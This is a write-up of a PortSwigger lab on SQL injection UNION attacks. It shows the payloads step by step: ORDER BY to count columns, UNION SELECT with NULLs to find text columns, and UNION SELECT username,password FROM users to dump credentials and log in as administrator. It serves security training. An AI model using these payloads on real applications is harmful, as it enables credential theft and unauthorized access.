## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/357366bf0e25866c031a4eed18b25a99fbe341dd/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables/Images/Lab%20Description.png)

## Solution :

> The database contains a different table called **users**, with columns called username and password.

#### Determine number of columns

**ORDER BY 3** shows an error , it means the web application retreives 2 columns in the query

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/a576ec6cb10ec736748875ba75846d20e40e3b50/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables/Images/ORDER%20BY%203.png)

#### Determine which column contains text data

*1st columns returns text data*

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'A',NULL --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/9f5ab59fd96e29258d7b3d30cad68cb73eca247d/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables/Images/Payload%20in%201st%20NULL.png)

*2nd column also retreives text data*

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'A' --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/7343f0401ef9008dc3b4c5f7185d5855ce89d669/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables/Images/Payload%20in%202nd%20NULL.png)

Since both the columns contain text data, we can retreive username and password from the users table of the database without any concatination method.


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT username,password FROM users --
```
![image]()

![image]()

![image]()

Thus we got all the usernames & password stored in the database.

Now we can login as administrator !

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/0e82303d4fb354d0f1d4190daf40f33f069abcc0/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables/Images/Lab%20Solution.png)



